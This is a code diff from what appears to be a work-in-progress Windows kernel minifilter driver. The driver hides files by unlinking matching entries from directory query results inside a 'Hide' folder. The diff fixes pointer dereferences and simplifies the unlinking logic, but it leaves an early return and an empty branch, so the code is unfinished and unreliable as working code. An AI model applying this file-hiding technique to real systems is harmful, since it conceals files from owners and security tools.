@@ -158,7 +158,7 @@ namespace filter
 
         if (IsMyFolder(data, (PWCHAR)L"Hide") == false)
         {
-            goto ret_post_dir_con;
+            return FLT_POSTOP_FINISHED_PROCESSING;
         }
 
         if (data->Iopb->MinorFunction == IRP_MN_QUERY_DIRECTORY)
@@ -223,7 +223,6 @@ namespace filter
         DebugMessage("In directory: ");
         PrintCurFileName(data);
 
-        ret_post_dir_con:
         return FLT_POSTOP_FINISHED_PROCESSING;
     }
 
@@ -238,16 +237,25 @@ namespace filter
 
         WCHAR fileNameStr[MAX_SIZE];
 
+
         DebugMessage("Begin print");
+
+        DebugMessage("%I64d", nextEntryRva);
+        DebugMessage("%I64d", fileNameRva);
+        DebugMessage("%I64d", fileNameLengthRva);
+
+        DebugMessage("End print");
+        return true;
+
 
         if (info != NULL)
         {
             while (true)
             {
-                ULONG nextEntryCur = (ULONG *)((PUCHAR)info + nextEntryRva);
-                PWCHAR fileName = (PWCHAR*)((PUCHAR)info + fileNameRva);
-                ULONG fileNameLength = (ULONG*)((PUCHAR)info + fileNameLengthRva);
-                DebugMessage("Cur Addr: 0x%p, NextEntryOffset: 0x%x", &info, nextEntry);
+                ULONG nextEntryCur = *(ULONG *)((PUCHAR)info + nextEntryRva);
+                PWCHAR fileName = *(PWCHAR*)((PUCHAR)info + fileNameRva);
+                ULONG fileNameLength = *(ULONG*)((PUCHAR)info + fileNameLengthRva);
+                // DebugMessage("Cur Addr: 0x%p, NextEntryOffset: 0x%x", &info, nextEntry);
 
                 debug::PrintWstring(fileName, fileNameLength);
 
@@ -257,20 +265,13 @@ namespace filter
                     
                     if (ulti::CheckSubstring(fileNameStr, file_to_hide_) == true)
                     {
-                        if (previous_info != NULL)
+                        if (prev_info != NULL)
                         {
-                            if (info->NextEntryOffset != 0)
-                            {
-                                ulti::SetUlongAt((long long)prev_info + nextEntryRva, ulti::GetUlongAt((long long)info + nextEntryRva));
-                            }
-                            else
-                            {
-                                ulti::SetUlongAt((long long)prev_info + nextEntryRva, 0);
-                            }
+                            ulti::SetUlongAt((long long)prev_info + nextEntryRva, ulti::GetUlongAt((long long)info + nextEntryRva));
                         }
                         else
                         {
-                            if ()
+                            
                         }
                     }
 
@@ -282,7 +283,7 @@ namespace filter
                 }
                 else
                 {
-                    info = ((PUCHAR)info + nextEntry);
+                    info = ((PUCHAR)info + nextEntryCur);
                 }
             }
         }
